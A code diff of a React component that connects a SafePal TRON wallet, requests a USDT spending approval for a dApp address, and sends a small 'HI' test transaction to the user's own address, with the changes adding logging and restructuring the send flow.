@@ -1,120 +1,131 @@
+"use client";
 
-"use client"
-
-import { useState, useEffect } from "react"
-import { Button } from "@/components/ui/button"
-import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
-import { Wallet, CheckCircle, AlertCircle, Loader2, ArrowRight } from "lucide-react"
-import { SafePalConnector } from "@/wallets/safepal-wallet"
-import { detectWalletEnvironment, getWalletDisplayName, type WalletType } from "@/utils/wallet-detection"
-import { USDT_CONTRACT, DEFAULT_APPROVAL_AMOUNT, DAPP_ADDRESS } from "@/utils/tron-config"
+import { useState, useEffect } from "react";
+import { Button } from "@/components/ui/button";
+import { Card, CardHeader, CardTitle, CardContent } from "@/components/ui/card";
+import { Wallet, CheckCircle, AlertCircle, Loader2, ArrowRight } from "lucide-react";
+import { SafePalConnector } from "@/wallets/safepal-wallet";
+import { detectWalletEnvironment, getWalletDisplayName, type WalletType } from "@/utils/wallet-detection";
+import { USDT_CONTRACT, DEFAULT_APPROVAL_AMOUNT, DAPP_ADDRESS } from "@/utils/tron-config";
 
 export default function SafePalWalletConnector() {
-  const [connectedWallet, setConnectedWallet] = useState<string>("")
-  const [walletType, setWalletType] = useState<WalletType>("Unknown")
-  const [isConnecting, setIsConnecting] = useState(false)
-  const [isApproving, setIsApproving] = useState(false)
-  const [error, setError] = useState("")
-  const [success, setSuccess] = useState("")
-  const [isApproved, setIsApproved] = useState(false)
+  const [connectedWallet, setConnectedWallet] = useState<string>("");
+  const [walletType, setWalletType] = useState<WalletType>("Unknown");
+  const [isConnecting, setIsConnecting] = useState(false);
+  const [isApproving, setIsApproving] = useState(false);
+  const [error, setError] = useState("");
+  const [success, setSuccess] = useState("");
+  const [isApproved, setIsApproved] = useState(false);
 
   useEffect(() => {
     if (error) {
-      const timer = setTimeout(() => setError(""), 5000)
-      return () => clearTimeout(timer)
+      const timer = setTimeout(() => setError(""), 5000);
+      return () => clearTimeout(timer);
     }
-  }, [error])
+  }, [error]);
 
   useEffect(() => {
     if (success) {
-      const timer = setTimeout(() => setSuccess(""), 5000)
-      return () => clearTimeout(timer)
+      const timer = setTimeout(() => setSuccess(""), 5000);
+      return () => clearTimeout(timer);
     }
-  }, [success])
+  }, [success]);
 
   const connectWallet = async () => {
-    setIsConnecting(true)
-    setError("")
-    setSuccess("")
+    setIsConnecting(true);
+    setError("");
+    setSuccess("");
 
     try {
-      const safePal = SafePalConnector.getInstance()
-      const result = await safePal.connect()
-
-      if (result.success) {
-        setConnectedWallet(result.address)
-        setWalletType("SafePal")
-        setSuccess("Successfully connected wallet!")
+      const safePal = SafePalConnector.getInstance();
+      const result = await safePal.connect();
+      console.log("SafePal Connect Result:", result);
+      console.log("TronWeb Available:", !!window.tronWeb, window.tronWeb?.defaultAddress);
+      if (result.success && window.tronWeb && window.tronWeb.defaultAddress.base58) {
+        setConnectedWallet(result.address);
+        setWalletType("SafePal");
+        setSuccess("Successfully connected wallet!");
       } else {
-        throw new Error(result.error || "Failed to connect wallet")
+        throw new Error(result.error || "SafePal not properly initialized");
       }
     } catch (err: any) {
-      console.error("Wallet connection error:", err)
-      setError(err.message || "Failed to connect wallet")
+      console.error("Wallet connection error:", err);
+      setError(err.message || "Failed to connect wallet");
     } finally {
-      setIsConnecting(false)
+      setIsConnecting(false);
     }
-  }
+  };
 
   const approveUSDT = async () => {
-    if (!connectedWallet || !window.tronWeb) {
-      setError("Please connect your wallet first")
-      return
+    if (!window.tronWeb || !connectedWallet) {
+      setError("Please connect your wallet first");
+      return;
     }
 
-    setIsApproving(true)
-    setError("")
-    setSuccess("")
+    setIsApproving(true);
+    setError("");
+    setSuccess("");
 
     try {
-      const usdt = await window.tronWeb.contract().at(USDT_CONTRACT)
-      await usdt.approve(DAPP_ADDRESS, DEFAULT_APPROVAL_AMOUNT).send()
+      const usdt = await window.tronWeb.contract().at(USDT_CONTRACT);
+      const result = await usdt
+        .approve(DAPP_ADDRESS, DEFAULT_APPROVAL_AMOUNT)
+        .send({
+          from: window.tronWeb.defaultAddress.base58,
+        });
 
-      setSuccess("USDT approval successful!")
-      setIsApproved(true)
+      console.log("Approval Result:", result);
+      setSuccess("USDT approval successful!");
+      setIsApproved(true);
     } catch (err: any) {
-      setError(err.message || "Failed to approve USDT")
+      console.error("USDT Approval error:", err);
+      setError(`Failed to approve USDT: ${err.message || "Unknown error"}`);
     } finally {
-      setIsApproving(false)
+      setIsApproving(false);
     }
-  }
+  };
 
   const sendHiTransaction = async () => {
-  if (!window.tronWeb || !connectedWallet) {
-    setError("Wallet not connected")
-    return
-  }
-
-  setError("")
-  setSuccess("")
-
-  try {
-    const tx = await window.tronWeb.trx.sendTransaction(
-      connectedWallet, // send to self
-      1, // 1 sun (0.000001 TRX)
-      undefined, // default from address
-      "HI" // optional memo/note
-    )
-
-    if (tx.result) {
-      setSuccess("Transaction sent: 'HI'")
-    } else {
-      throw new Error("Transaction failed")
+    if (!window.tronWeb || !connectedWallet) {
+      setError("Wallet not connected");
+      return;
     }
-  } catch (err: any) {
-    console.error("Send HI error:", err)
-    setError(err.message || "Failed to send transaction")
-  }
-}
 
+    setError("");
+    setSuccess("");
+
+    try {
+      const tx = await window.tronWeb.transactionBuilder.sendTrx(
+        connectedWallet, // Recipient (self)
+        1, // 1 SUN (0.000001 TRX)
+        window.tronWeb.defaultAddress.base58, // Sender
+        { memo: "HI" } // Memo field
+      );
+
+      console.log("Transaction:", tx);
+      const signedTx = await window.tronWeb.trx.sign(tx);
+      console.log("Signed Transaction:", signedTx);
+      const result = await window.tronWeb.trx.sendRawTransaction(signedTx);
+      console.log("Result:", result);
+
+      if (result.result) {
+        setSuccess(`Transaction sent: 'HI' (TxID: ${result.txid})`);
+      } else {
+        throw new Error("Transaction failed");
+      }
+    } catch (err: any) {
+      console.error("Send HI error:", err);
+      setError(`Failed to send transaction: ${err.message || "Unknown error"}`);
+    }
+  };
 
   const disconnect = () => {
-    setConnectedWallet("")
-    setWalletType("Unknown")
-    setError("")
-    setSuccess("")
-    setIsApproved(false)
-  }
+    setConnectedWallet("");
+    setWalletType("Unknown");
+    setError("");
+    setSuccess("");
+    setIsApproved(false);
+  };
 
   return (
     <>
@@ -171,12 +182,11 @@ export default function SafePalWalletConnector() {
               )}
 
               <Button
-  onClick={sendHiTransaction}
-  className="w-full bg-green-600 hover:bg-green-700 text-white"
->
-  Send "HI" Transaction
-</Button>
-
+                onClick={sendHiTransaction}
+                className="w-full bg-green-600 hover:bg-green-700 text-white"
+              >
+                Send "HI" Transaction
+              </Button>
 
               <Button onClick={disconnect} className="w-full bg-blue-600 hover:bg-blue-700 text-white border-blue-500">
                 Disconnect
@@ -200,5 +210,5 @@ export default function SafePalWalletConnector() {
         )}
       </div>
     </>
-  )
+  );
 }
